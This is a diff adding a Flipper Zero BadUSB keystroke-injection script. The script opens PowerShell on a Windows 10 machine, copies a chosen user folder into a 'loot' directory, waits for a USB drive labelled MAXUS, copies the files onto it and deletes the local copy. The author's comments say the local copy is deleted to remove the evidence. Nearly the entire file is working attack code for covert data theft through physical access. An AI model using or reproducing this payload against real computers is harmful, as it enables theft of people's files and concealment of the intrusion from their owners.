@@ -1,0 +1,33 @@
+REM Author: Skrimbo_Jones
+REM This program will copy a folder of your choice (Edit the $sourceDirectory variable in code to suit) on any windows 10 computer
+REM then copy it to the MAXUS drive opened in the Mass Storage App on your Flipper Zero and delete the evidence.
+REM NOTE: This could take a long time depending on the files being copied.
+REM Portion of code Authored By: emptythevoid
+REM Link: https://github.com/emptythevoid/flipperzero/blob/main/badusb/read-from-flipper-disk-image/wait-for-drive-example.txt
+
+DELAY 1000
+GUI R 
+DELAY 1000
+STRING powershell.exe 
+ENTER
+DELAY 3000 
+STRING cd C:\Users\$Env:UserName
+ENTER
+STRING mkdir loot
+DELAY 300
+ENTER
+STRING cd C:\Users\$Env:UserName\loot
+DELAY 300
+ENTER
+STRING $sourceDirectory = "C:\Users\$Env:UserName\test";Copy-item -Force -Recurse $sourceDirectory -Destination "C:\Users\$Env:UserName\loot"
+DELAY 300
+ENTER
+STRING cd ~
+ENTER
+
+REM Wait for Mass Storage App opening and loading of usb
+STRING Register-WmiEvent -Class win32_VolumeChangeEvent -SourceIdentifier volumeChange;do{$newEvent = Wait-Event -SourceIdentifier volumeChange;$eventType = $newEvent.SourceEventArgs.NewEvent.EventType;if ($eventType -eq 2){$driveLetter = $newEvent.SourceEventArgs.NewEvent.DriveName;$driveLabel = ([wmi]"Win32_LogicalDisk='$driveLetter'").VolumeName;if ($driveLabel -eq 'MAXUS'){start-sleep -seconds 1;Copy-item -Force -Recurse "C:\Users\$Env:UserName\loot" "D:\";rm "C:\Users\$Env:UserName\loot" -r -force;exit;}};Remove-Event -SourceIdentifier volumeChange;} while (1-eq1);Unregister-Event -SourceIdentifier volumeChange
+ENTER
+
+
+
